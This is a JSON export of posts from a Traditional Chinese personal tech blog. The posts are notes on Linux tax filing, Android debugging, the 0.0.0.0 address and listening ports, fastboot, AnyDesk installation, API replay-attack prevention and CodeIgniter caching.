[{"title":"2018年用elementaryOS報稅小記","url":"/blog/2018/05/09/2018%E5%B9%B4%E7%94%A8elementaryOS%E5%A0%B1%E7%A8%85%E5%B0%8F%E8%A8%98/","content":"<p>最近看到報稅能用Mac或Linux<br>剛好又懶的請假去現場排隊<br>家裡有一個Linux<br>就當勇者，用Linux報稅(一堆教學都是Mac… orz)</p>\n<p>這邊只做踩到雷筆記</p>\n<a id=\"more\"></a>\n<p>詳細過程這邊寫得很清楚<br><a href=\"https://applealmond.com/posts/31080\" target=\"_blank\" rel=\"noopener\">2018 Mac 報稅教學 ，線上申報、繳稅、綜所稅（健保卡/自然人憑證教學） - 蘋果仁 - 你的科技媒體</a><br><a href=\"https://www.kocpc.com.tw/archives/195099\" target=\"_blank\" rel=\"noopener\">2018 年全民報稅季：用 Mac 網路報稅 超簡單！線上申報、繳稅、綜所稅教學 - 電腦王阿達</a></p>\n<p>我是選健保卡<br><a href=\"https://efile.tax.nat.gov.tw/irxw/index.jsp\" target=\"_blank\" rel=\"noopener\">https://efile.tax.nat.gov.tw/irxw/index.jsp</a></p>\n<p>詳細步驟我就不寫了…<br>我只記錄我卡住的地方</p>\n<p>照作業系統下載程式<br>裡面有教學文件<br><img src=\"/blog/2018/05/09/2018年用elementaryOS報稅小記/1525010735-dc0e6c3202efa14ae0b644876d5863b1.png\"><br>憑證記得要案加入信任服務<br><img src=\"/blog/2018/05/09/2018年用elementaryOS報稅小記/01.png\" title=\"slug [01]\"><br>這邊照他做apt-get update跟apt-get upgrade</p>\n<p>之後讀卡機套件需要裝(我一開始沒裝)</p>\n<p>解壓縮可以直接GUI拖移XD<br><img src=\"/blog/2018/05/09/2018年用elementaryOS報稅小記/02.png\" title=\"slug [02]\"><br><img src=\"/blog/2018/05/09/2018年用elementaryOS報稅小記/03.png\" title=\"slug [03]\"></p>\n<img src=\"/blog/2018/05/09/2018年用elementaryOS報稅小記/04.png\" title=\"slug [04]\">\n<p>其實我做到<code>上圖</code>有卡住，有一直試sudo ./Install 和sudo ./UnInstall<br>不過一直失敗…，後來重開機，再重安裝就正常了….</p>\n<img src=\"/blog/2018/05/09/2018年用elementaryOS報稅小記/05.png\" title=\"slug [05]\">\n<img src=\"/blog/2018/05/09/2018年用elementaryOS報稅小記/06.png\" title=\"(我沒用加入信任服務狀態下) [06]\">\n<p>不正常的圖示，正常紅色有可能是剛剛裝的東西或憑證沒加入信任服務</p>\n<p>很開心點選下一步，他說沒有讀到讀卡機<br>參考<a href=\"http://ycfu.blog.mypc.tw/2008/03/linux.html\" target=\"_blank\" rel=\"noopener\">阿呆的blog: Linux 晶片卡讀卡機 使用心得</a><br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-get install pcsc-tools pcscd</span><br></pre></td></tr></table></figure></p>\n<p>安裝完，就能讀取了XD</p>\n<p>然後順利繳稅…</p>\n<p>愉悅!!!</p>\n<p>等等…超商繳稅在哪裡</p>\n<blockquote>\n<p>近年來配合推廣節能減碳，民眾在家裡就可以列印自繳稅款繳款書。<br>列印附條碼繳款書操作方法如下：</p>\n<ol>\n<li>首先至「財政部稅務入口網」(網址：<a href=\"http://www.etax.nat.gov.tw/\" target=\"_blank\" rel=\"noopener\">http://www.etax.nat.gov.tw/</a>) 網站首頁</li>\n<li>點選「線上服務」，再選擇「電子申報繳稅服務」</li>\n<li>進入「自繳繳款書三段式條碼列印(線上版)」點選欲列印之繳款書，並鍵入完整基本資料，即可列印條碼繳款書。<br>民眾亦可進入「自繳繳款書三段式條碼列印(離線版)，下載離線版程式，就能批次列印條碼繳款書，即便在入口網網站或網路連線異常時，服務皆不中斷，十分便利。<br>納稅義務人可持條碼繳款書，至代收稅款之金融機構繳納(郵局不代收)，如稅額在-2萬元以下案件，亦可選擇至便利商店以現金繳納，惟超過繳納期限2天後之案件，因有加徵滯納金及滯納利息之情形，超商無法代收，只能至金融機構繳納。<br>「自繳繳款書三段式條碼列印」係提供產製列印條碼繳款書之平台，僅具有自動檢核統一編號或身分證統一編號編碼邏輯性，並無上傳或儲存功能，納稅義務人無須擔心個人資料外洩。</li>\n</ol>\n</blockquote>\n<p><a href=\"http://blog.xuite.net/canny168/twblog/360197894-%E5%85%8D%E5%87%BA%E9%96%80%E5%B0%B1%E8%83%BD%E5%88%97%E5%8D%B0%E8%87%AA%E7%B9%B3%E7%A8%85%E6%AC%BE%E7%B9%B3%E6%AC%BE%E6%9B%B8\" target=\"_blank\" rel=\"noopener\">免出門就能列印自繳稅款繳款書 @ Canny 部落格 :: 隨意窩 Xuite日誌</a></p>\n<p>點選  「綜合所得稅結算稅額繳款書(自行繳納)—15G」<br>我打算在公司用一用列印出來</p>\n<p><strong>技術小記</strong></p>\n<p>雖然沒看一仔細技術，大約猜測是用Websocket串起來的<br><del>那個安裝我猜測是在本機架Websocket 讀取讀卡機?</del><br>算了，我沒有仔細看，先別做結論</p>\n<p>至於之前有跟同事討論到websocket有跨網域問題<br>但加入安全認證可以跨網域?<br>這點可能之後可以玩一下</p>\n","categories":["實用工具"],"tags":["報稅","Linux"]},{"title":"Android在Chrome做Debug封包方法","url":"/blog/2019/05/20/Android%E5%9C%A8Chrome%E5%81%9ADebug%E5%B0%81%E5%8C%85%E6%96%B9%E6%B3%95/","content":"<p>之前只會用 Fiddler 做 Android Debug 工具<br>但當沒有同網段網域的時候，就不會很方便處理問題<br>前陣子有人推薦用 Android Studio 工具<br>裡面的 Network 可以看<a href=\"https://developer.android.com/studio/profile/network-profiler\" target=\"_blank\" rel=\"noopener\">Inspect network traffic with Network Profiler | Android Developers</a><br>但感覺…殺雞焉用牛刀<br>最近聽到 Chrome 插 USB 也能用 Debug!!!</p>\n<a id=\"more\"></a>\n<p><a href=\"https://developers.google.com/web/tools/chrome-devtools/remote-debugging/?hl=zh-tw\" target=\"_blank\" rel=\"noopener\">遠程調試 Android 設備使用入門 | Tools for Web Developers | Google Developers</a></p>\n<p><a href=\"http://askeing.blogspot.com/2016/04/devtools-android-chrome.html\" target=\"_blank\" rel=\"noopener\">星塵 AskeinG: [分享] 透過 DevTools 在 Android Chrome 除錯</a></p>\n<p>只能說 666，有時間再來筆記<br>最近太忙 orz</p>\n<p><strong>2019-06-25</strong><br>發現新工具，有時間再來試試<br><a href=\"https://mitmproxy.org/\" target=\"_blank\" rel=\"noopener\">mitmproxy - an interactive HTTPS proxy</a><br><a href=\"https://louie023.wordpress.com/2014/09/27/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-mitmproxy-%E4%BE%86%E7%9B%A3%E7%9C%8B%E6%89%8B%E6%A9%9F%E4%B8%8A%E7%9A%84-apps-%E9%80%A3%E7%B7%9A%E5%88%B0%E5%93%AA%E4%BA%9B%E7%B6%B2%E7%AB%99/\" target=\"_blank\" rel=\"noopener\">如何使用 mitmproxy 來監看手機上的 apps 連線到哪些網站 | 隨便寫寫</a></p>\n","categories":["實用工具"],"tags":["android","chrome"]},{"title":"0.0.0.0 是什麼小知識","url":"/blog/2020/05/30/0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98/","content":"<p>我們常常使用架一些程式服務<br>都會設定 host(0.0.0.0)<br>通常都會認為開 port<br>也知道對 ip 設定 192.168.1.111<br>也有看過對 192.168.1.0 設定（會當下看網路卡 ip）<br>我沒認真探討<br>此篇可能有誤，歡迎指正，<del>請手下留情</del></p>\n<a id=\"more\"></a>\n<p>故事是這樣的，最近我們公司有多個專案，聽到都是放在獨立機器，各自一組IP。<br>最近我不小心 FTP 設定錯 IP，但是上傳檔案上去。發現 http server(IP對的)竟然更新了。<br>我覺得很奇怪不是不同台電腦，後來發現那一台設定很多虛擬 IP。</p>\n<p>這之後也會寫一個文章，怎麼實做看看。<br>不過…，為什麼可以在很多台開同一個 port 呢?</p>\n<p>後來發現 port 是綁在網卡上面…，一台電腦多個IP綁很多個 http (80port)</p>\n<h2 id=\"簡單敘說-IP\"><a href=\"#簡單敘說-IP\" class=\"headerlink\" title=\"簡單敘說 IP\"></a>簡單敘說 IP</h2><p>基本 IPv4 就不仔細說</p>\n<ol>\n<li>IP 預設常見 Class 分級</li>\n</ol>\n<p>Class A<br>Class B<br>Class C</p>\n<p>很多網頁有說，這邊不仔細講，主要預設切出來網址都是固定的。<br>可參考:<a href=\"http://kevin.hwai.edu.tw/~kevin/material/EAssistant/IP_Class.htm\" target=\"_blank\" rel=\"noopener\">IP位址分五種等級</a></p>\n<ol start=\"2\">\n<li>CIDR 網域切割</li>\n</ol>\n<p>通常我一直搞不懂為什麼有分Class A,Class B, Class C ，然後後續討論可以自訂網路遮罩切割網域<br>後來最近爬了一下，因為有了 CIDR，所以每一台電腦都可以設定網路遮罩<br>可細分切出多種網路 IP</p>\n<p>詳細:<a href=\"http://www.tsnien.idv.tw/Internet_WebBook/chap6/6-14%20CIDR%20%E8%B7%AF%E5%BE%91%E5%8D%94%E5%AE%9A.html\" target=\"_blank\" rel=\"noopener\">CIDR 路徑協定</a></p>\n<h2 id=\"特殊-IP\"><a href=\"#特殊-IP\" class=\"headerlink\" title=\"特殊 IP\"></a>特殊 IP</h2><h3 id=\"127-0-0-1\"><a href=\"#127-0-0-1\" class=\"headerlink\" title=\"127.0.0.1\"></a>127.0.0.1</h3><p>簡單就是我們常用的 localhost</p>\n<blockquote>\n<p>127.0.0.1屬於{127,}集合中的一個，而所有網絡號為127的地址都被稱之為迴環地址，所以迴環地址！=127.0.0.1,它們是包含關係，即迴環地址包含127.0.0.1。</p>\n</blockquote>\n<h3 id=\"0-0-0-0\"><a href=\"#0-0-0-0\" class=\"headerlink\" title=\"0.0.0.0\"></a>0.0.0.0</h3><p>這邊<a href=\"https://zhuanlan.zhihu.com/p/72988255\" target=\"_blank\" rel=\"noopener\">127.0.0.1和0.0.0.0地址的区别 - 知乎</a>有爬到一些相關知識<br>不過內容好像也不是很正確<br>擷取一些回覆</p>\n<blockquote>\n<p>「0.0.0.0是本網絡中的本主機」這種老掉牙中文教科書說法就不要提了。實際上外文資料/軟件裡一般把0.0.0.0稱為「unspecified」，即未指定（即無效的，無意義的）地址。從功能上看，一般用於某些程序/網絡協議中不便使用具體ip的特殊情況（說白了就是一個用於某些比較坑的情況的「佔位符」），比如DHCP客戶端還未獲取到ip的時候規定使用0.0.0.0作「源地址」，或者服務器不指定在哪個網卡上監聽時，也使用0.0.0.0。</p>\n</blockquote>\n<p>其他也有找到<a href=\"https://stackoverflow.com/questions/20778771/what-is-the-difference-between-0-0-0-0-127-0-0-1-and-localhost/20778887#20778887\" target=\"_blank\" rel=\"noopener\">ip - What is the difference between 0.0.0.0, 127.0.0.1 and localhost? - Stack Overflow</a></p>\n<blockquote>\n<p>IPV4中，0.0.0.0地址被用於表示一個無效的，未知的或者不可用的目標。</p>\n<ul>\n<li>在服務器中，0.0.0.0指的是本機上的所有IPV4地址，如果一個主機有兩個IP地址，192.168.1.1 和 10.1.2.1，並且該主機上的一個服務監聽的地址是0.0.0.0,那麼通過兩個ip地址都能夠訪問該服務。</li>\n<li>在路由中，0.0.0.0表示的是默認路由，即當路由表中沒有找到完全匹配的路由的時候所對應的路由。<br>————————————————<br>版权声明：本文为CSDN博主「ythunder」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href=\"https://blog.csdn.net/ythunder/java/article/details/61931080\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/ythunder/java/article/details/61931080</a></li>\n</ul>\n</blockquote>\n<h4 id=\"INADDR-ANY\"><a href=\"#INADDR-ANY\" class=\"headerlink\" title=\"INADDR_ANY\"></a>INADDR_ANY</h4><blockquote>\n<p>NADDR_ANY介紹</p>\n<p>INADDR_ANY 指定地址為0.0.0.0的地址，這個地址事實上表示不確定地址或“所有地址”、“任意地址”。一般來說，在各個系統中均定義成為0值。</p>\n<p>INADDR_ANY 的具體含義是，綁定到0.0.0.0。此時，對所有的地址都將是有效的，如果系統考慮採用多個網卡的話，那麼使用此種bind，將在所有網卡上進行綁定。在這種情況下，你可以收到發送到所有有效地址上封包。<br>參考:<a href=\"https://bulifehappy.wordpress.com/2010/11/23/%E3%80%90socket%E3%80%91inaddr_any-of-socket-programming/\" target=\"_blank\" rel=\"noopener\">【Socket】INADDR_ANY of SOCKET Programming «＊～【ＢｕｂＵｓＨａＲｅ】～＊ ＊～【ＢｕｂＵｓＨａＲｅ】～＊</a></p>\n</blockquote>\n<h3 id=\"其他特殊IP\"><a href=\"#其他特殊IP\" class=\"headerlink\" title=\"其他特殊IP\"></a>其他特殊IP</h3><blockquote>\n<p>2.3 特殊IP地址</p>\n<p>特殊IP地址就是用來做一些特殊的事情。RFC1700中定義了以下特殊IP地址。</p>\n<pre><code>{0,0}:網絡號和主機號都全部為0，表示「本網絡上的本主機」，只能用作源地址。\n{0，host-id}:本網絡上的某台主機。只能用作源地址。\n{-1,-1}：表示網絡號和主機號的所有位上都是1（二進制），用於本網絡上的廣播，只能用作目的地址，發到該地址的數據包不能轉發到源地址所在網絡之外。\n</code></pre><p>   {net-id,-1}:直接廣播到指定的網絡上。只能用作目的地址。<br>   {net-id,subnet-id,-1}:直接廣播到指定網絡的指定子網絡上。只用作目的地址。<br>   {net-id,-1,-1}:直接廣播到指定網絡的所有子網絡上。只能用作目的地址。<br>   {127，}:即網絡號為127的任意ip地址。都是內部主機迴環地址(loopback),永遠都不能出現在主機外部的網絡中。</p>\n</blockquote>\n<p>這編原本我看不懂<code>{}</code>裡面的意思<br>後來查了一下 IP 有分{Net_id,Host_id}<br>簡單來說這邊 Host_id 就把他想成能用的 IP<br>0是整個填 0，<strong>-1就是整個填1</strong></p>\n<p>10.x.x.x</p>\n<p>172.16。x。x∼172.31。x。x</p>\n<p>192.168。x。x</p>\n<p>私有位址，這些位址被大量用於企業內部網路中。</p>\n<p>224.0.0.1</p>\n<p>其他參考:<br><a href=\"https://blog.csdn.net/qq_38410730/article/details/80980749\" target=\"_blank\" rel=\"noopener\">【TCP/IP】IP地址分类和特殊IP地址_网络_Yngz_Miao的博客-CSDN博客</a><br><a href=\"http://www.pcnet.idv.tw/pcnet/network/network_ip_addr.htm\" target=\"_blank\" rel=\"noopener\">網路教學-IP 位址</a></p>\n<h2 id=\"觀察監聽-port\"><a href=\"#觀察監聽-port\" class=\"headerlink\" title=\"觀察監聽 port\"></a>觀察監聽 port</h2><h3 id=\"windows\"><a href=\"#windows\" class=\"headerlink\" title=\"windows\"></a>windows</h3><p>netstat -ano</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\Administrator&gt;netstat -ano</span><br><span class=\"line\"></span><br><span class=\"line\">使用中連線</span><br><span class=\"line\"></span><br><span class=\"line\">  協定   本機位址               外部位址               狀態            PID</span><br><span class=\"line\">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4</span><br><span class=\"line\">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       480</span><br><span class=\"line\">  TCP    127.0.0.1:10400        0.0.0.0:0              LISTENING       7708</span><br><span class=\"line\">  TCP    127.0.0.1:10401        0.0.0.0:0              LISTENING       7708</span><br><span class=\"line\">  TCP    127.0.0.1:10402        0.0.0.0:0              LISTENING       7708</span><br><span class=\"line\">  TCP    127.0.0.1:10403        0.0.0.0:0              LISTENING       7708</span><br><span class=\"line\">  TCP    127.0.0.1:10403        127.0.0.1:2362         ESTABLISHED     7708</span><br><span class=\"line\">  TCP    127.0.0.1:15292        0.0.0.0:0              LISTENING       6320</span><br><span class=\"line\">  TCP    192.168.1.107:139      0.0.0.0:0              LISTENING       4</span><br></pre></td></tr></table></figure>\n<p>看邊主要看 LISTENING 可以看到有開那些 port<br>第一個 80 port 會對所有網路卡</p>\n<h2 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">netstat -pnltu</span><br></pre></td></tr></table></figure>\n<p>更多可看:<a href=\"https://www.opencli.com/linux/linux-install-use-netstat\" target=\"_blank\" rel=\"noopener\">Linux 安裝及使用 netstat</a></p>\n<h3 id=\"設定-apache-port-觀察\"><a href=\"#設定-apache-port-觀察\" class=\"headerlink\" title=\"設定 apache port 觀察\"></a>設定 apache port 觀察</h3><h4 id=\"0-0-0-0-1\"><a href=\"#0-0-0-0-1\" class=\"headerlink\" title=\"0.0.0.0\"></a>0.0.0.0</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># If you just change the port or add more ports here, you will likely also</span><br><span class=\"line\"># have to change the VirtualHost statement in</span><br><span class=\"line\"># /etc/apache2/sites-enabled/000-default.conf</span><br><span class=\"line\"></span><br><span class=\"line\">Listen 80</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class=\"line\">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 0.0.0.0:56081           0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 0.0.0.0:7070            0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 0.0.0.0:160             0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 0.0.0.0:54401           0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 0.0.0.0:42979           0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 0.0.0.0:51523           0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp6       0      0 :::111                  :::*                    LISTEN      -                   </span><br><span class=\"line\">tcp6       0      0 :::80                   :::*                    LISTEN      -</span><br></pre></td></tr></table></figure>\n<h4 id=\"192-168-1-x\"><a href=\"#192-168-1-x\" class=\"headerlink\" title=\"192.168.1.x\"></a>192.168.1.x</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class=\"line\">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 192.168.1.117:80        0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure>\n<h4 id=\"192-168-1-0\"><a href=\"#192-168-1-0\" class=\"headerlink\" title=\"192.168.1.0\"></a>192.168.1.0</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class=\"line\">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   </span><br><span class=\"line\">tcp        0      0 192.168.1.0:80          0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure>\n<p>這個目前沒找到相關文獻<br>但是我發現 這個好像是廣播網路?<br>預設會跟所有 192.168 網路卡做 bind port(尚未測試兩個相同網段IP)</p>\n<p>這邊也不是打 192.0.0.0 就可以設定</p>\n<h2 id=\"其他有趣東西\"><a href=\"#其他有趣東西\" class=\"headerlink\" title=\"其他有趣東西\"></a>其他有趣東西</h2><h3 id=\"iperf\"><a href=\"#iperf\" class=\"headerlink\" title=\"iperf\"></a>iperf</h3><p>指令測試 IP 傳輸速度<br>通常我們在 Linux 下面可以透過 Iometer 去測試硬碟的效能速度,那網路呢!!要以免費最簡單使用的就算是 iperf 了.</p>\n<p><a href=\"http://benjr.tw/462\" target=\"_blank\" rel=\"noopener\">Linux command – iperf – Benjr.tw</a><br><a href=\"http://benjr.tw/19581\" target=\"_blank\" rel=\"noopener\">Linux – iperf (Bind to host) – Benjr.tw</a></p>\n","categories":["網路"],"tags":["ip","port"]},{"title":"Android手機電源鍵壞掉，開機方法","url":"/blog/2018/05/19/Android%E6%89%8B%E6%A9%9F%E9%9B%BB%E6%BA%90%E9%8D%B5%E5%A3%9E%E6%8E%89%EF%BC%8C%E9%96%8B%E6%A9%9F%E6%96%B9%E6%B3%95/","content":"<p>最近紅米NOTE3電源鍵壞了很久，但是平常可以指紋辨識解鎖<br>有幾次不小心關機，但是強按還是有辦法開機<br>但今天不行了….，剛好買新機<br>想備份LINE，但是無法開機<br>我Google尋了很多方法<br>最終採取fastboot開機法</p>\n<a id=\"more\"></a>\n<p><a href=\"http://www.jb51.net/shouji/193501.html\" target=\"_blank\" rel=\"noopener\">小米手机电源键坏了怎么办？怎么开机啊？<em>安卓手机</em>手机学院_脚本之家</a><br>這一篇使用結果沒用</p>\n<p>FastBoot 紅米NOTE3 進入方法 <code>音量键-  + 电源键 3秒</code><br>但是…，電源鍵壞掉…無法使用<br>不過可以插電源線充電插入時，按下<code>音量鍵-</code><br>可以進入fastboot模式</p>\n<p>最後，<a href=\"http://www.dayexie.com/detail1009393.html\" target=\"_blank\" rel=\"noopener\">[Linux] fastboot 用法學習歸納 - 代碼家</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:nilarimogard/webupd8</span><br><span class=\"line\">### 我沒有執行上面，發現內鍵可以安裝</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install android-tools-adb android-tools-fastboot</span><br></pre></td></tr></table></figure></p>\n<p>安裝FastBoot進入root，<code>fastboot reboot</code><br>你的手機就會重新開機</p>\n<img src=\"/blog/2018/05/19/Android手機電源鍵壞掉，開機方法/cli.png\" title=\"title\">\n<p>愉悅~~~</p>\n<p>手機設定畫面，第二章圖可以設定自動撥放<br></p>\n\n<p><a href=\"https://developers.google.com/web/updates/2017/09/autoplay-policy-changes\b\" target=\"_blank\" rel=\"noopener\">https://developers.google.com/web/updates/2017/09/autoplay-policy-changes\b</a><br><a href=\"https://times.hinet.net/news/21737359\" target=\"_blank\" rel=\"noopener\">https://times.hinet.net/news/21737359</a></p>\n<p><a href=\"http://www.dayexie.com/detail1009393.html\" target=\"_blank\" rel=\"noopener\">[Linux] fastboot 用法學習歸納 - 代碼家</a><br><a href=\"https://htcfz.wordpress.com/2016/07/05/adb-fastboot-common-commands/\" target=\"_blank\" rel=\"noopener\">adb &amp; fastboot 常用指令 – HTC Flash Zone</a></p>\n","categories":["Android"],"tags":["Android"]},{"title":"API 防重放小記(replay attack)","url":"/blog/2021/06/02/API-%E9%98%B2%E9%87%8D%E6%94%BE%E5%B0%8F%E8%A8%98-replay-attack/","content":"<p>最近思考怎麼預防尾造 API 回傳內容，剛好看到這幾篇文章<br>順便整理一下</p>\n<a id=\"more\"></a>\n<ul>\n<li><a href=\"https://segmentfault.com/a/1190000021922705\" target=\"_blank\" rel=\"noopener\">数据安全（反爬虫）之「防重放」策略 - SegmentFault 思否</a></li>\n<li><a href=\"https://blog.csdn.net/qq_43323585/article/details/106088470\" target=\"_blank\" rel=\"noopener\">网络安全问题-防篡改、防劫持、防重放_越学越菜的博客-CSDN博客</a></li>\n<li><a href=\"https://www.jianshu.com/p/6105b06aa208\" target=\"_blank\" rel=\"noopener\">开放平台API接口安全策略汇总 - 简书</a></li>\n<li><a href=\"https://www.jqhtml.com/49154.html\" target=\"_blank\" rel=\"noopener\">Spring Boot接口如何设计防篡改、防重放攻击 – 前端开发，JQUERY特效，全栈开发，vue开发</a></li>\n</ul>\n<p>簡單來說就是要做 sign 簽章，兩邊用一樣私鑰把內容加密(做簽章)，資料傳到Server 再把私私鑰做簽章，看sign傳過來的值有沒有一樣</p>\n<p>這時候我有想到兩邊問題，私鑰被知道不就無解，任何人不就能使用<br>這邊防禦是以中間人為考量，並非討論App是否被破解取得私鑰<br>也有想過用公鑰、私鑰做一次加密解密，還時會被APP解析破解取得加密密碼</p>\n<p>這時候加入 token 能有效杜絕這個問題(不是開放API的話)<br>api Token 是無狀態，自然可以解決上面問題<br><a href=\"https://www.jianshu.com/p/27317bd226fe\" target=\"_blank\" rel=\"noopener\">session/token (http是无状态协议) - 簡書</a></p>\n","categories":["程式心法"],"tags":["api","replay","attack"]},{"title":"Anydesk在Linux(elementaryOS)安裝小記","url":"/blog/2019/02/13/Anydesk%E5%9C%A8Linux-elementaryOS-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/","content":"<p>最近買 SSD 升級筆電<br>重新灌了 ElementaryOS<br>但發現之前 Anydesk 沒有記錄筆記<br>都會一直忘記 deb 要怎麼安裝<br>今天小記一下</p>\n<a id=\"more\"></a>\n<p>有爬到<a href=\"https://help.ubuntu.com/kubuntu/desktopguide/zh_TW/manual-install.html\" target=\"_blank\" rel=\"noopener\">手動安裝</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">安裝某個.deb檔案，簡單的在.deb檔案上Right單擊游標，然後選擇Kubuntu Package Menu-&gt;安裝軟體套件。</span><br><span class=\"line\">或者，你可以在終端下輸入如下內容來安裝.deb檔案</span><br><span class=\"line\">sudo dpkg -i 軟體套件名.deb</span><br><span class=\"line\">卸載.deb檔案，可以使用Adept，或輸入：</span><br><span class=\"line\">sudo apt-get remove 軟體套件名稱</span><br></pre></td></tr></table></figure>\n<p>用 dpkg 安裝沒有想到可以這樣做</p>\n<p>但有看到一種方式</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install ./anydesk_4.0.1-1_amd64.deb</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://support.anydesk.com/Command_Line_Interface\" target=\"_blank\" rel=\"noopener\">Command Line Interface - AnyDesk Help Center</a><br>安裝完設定，目前不確定是否要執行<code>--start-service</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">anydesk --start-service</span><br><span class=\"line\">anydesk --get-status</span><br></pre></td></tr></table></figure>\n<p>可以開啟<code>sudo anydesk</code>設定一些東西<br>但是設定<code>固定密碼</code>一直失敗</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo anydesk-global-settings</span><br></pre></td></tr></table></figure>\n<p>要打上面指令才能設定</p>\n","categories":["實用工具"],"tags":["anydesk","remoted desktop"]},{"title":"CI3 網頁緩存(web cache)小記","url":"/blog/2018/10/13/CI3-%E7%B6%B2%E9%A0%81%E7%B7%A9%E5%AD%98-web-cache-%E5%B0%8F%E8%A8%98/","content":"<p>最近做一個排行榜API<br>但回傳時間真的太久了<br>於是做一個緩存<br>突然想到Codeigiter內建有網頁緩存裝置<br>竟然內建有這個功能<br>那還要自己手刻嗎XD</p>\n<a id=\"more\"></a>\n<p>PHP<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(! <span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'HTTP_X_KEY'</span>]) ||  $_SERVER[<span class=\"string\">'HTTP_X_KEY'</span>] != <span class=\"string\">\"xxxxxxx\"</span>)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">          http_response_code( <span class=\"number\">500</span> );</span><br><span class=\"line\">          <span class=\"keyword\">die</span>( <span class=\"string\">'NO ENTER'</span> );</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      header(<span class=\"string\">\"x-api-key: xxxxxxx\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">$this</span>-&gt;output-&gt;cache(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"hello world2\"</span>;</span><br></pre></td></tr></table></figure></p>\n<p>就這麼簡單!!!</p>\n<p>原本怕這邊簡單測試假如失敗的時候，會不會直接緩存<br>會影響OK的，<br><code>測試結果是不會的</code></p>\n<p>cache(<code>分鐘</code>)</p>\n<p>最後小記</p>\n<p>因為PHP Codeigiter是吃a權限(不是apache)<br>但是cache是資料夾是設定755<br>原本想先對cache做777<br>其實我還不知道資料夾權限是吃什麼<br>最後可以跑cache</p>\n<p>所以最後看到cache檔案室吃<code>apache</code><br>其實把那個資料夾改成<code>apache</code>權限就能用了<br>也沒必要設定777</p>\n<p>假如真的覺得他的cache檔案設定不太好<br>可以從設定檔設定放置路徑<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$config[&apos;cache_path&apos;] = &quot;&quot;。如果您不想使用默認的緩存目錄（system/cache/）來存儲緩存，可以設置完整的服務器目錄</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://hk.saowen.com/a/2247a2730eb875d73a771b369fa169f2ec85e0a7766e7b9d69fe5cc1fded6849\" target=\"_blank\" rel=\"noopener\">【ci框架】config.php配置文檔解讀 - 掃文資訊</a></p>\n<p>有空來做php 讀取封包header筆記</p>\n<ul>\n<li><a href=\"https://blog.longwin.com.tw/2017/10/php-get-custom-http-header-2017/\" target=\"_blank\" rel=\"noopener\">PHP 讀取客製化傳送進來的 HTTP Header | Tsung’s Blog</a></li>\n<li><a href=\"https://kingfff.blogspot.com/2017/05/apache-php-header-server-invalid-characters-underscores.html\" target=\"_blank\" rel=\"noopener\">PHP無法在$_SERVER內取得自訂header</a></li>\n</ul>\n<p><code>apache_request_headers()</code>好像要裝apache套件才能用的樣子<br><a href=\"http://php.net/manual/en/function.getallheaders.php\" target=\"_blank\" rel=\"noopener\">PHP: getallheaders - 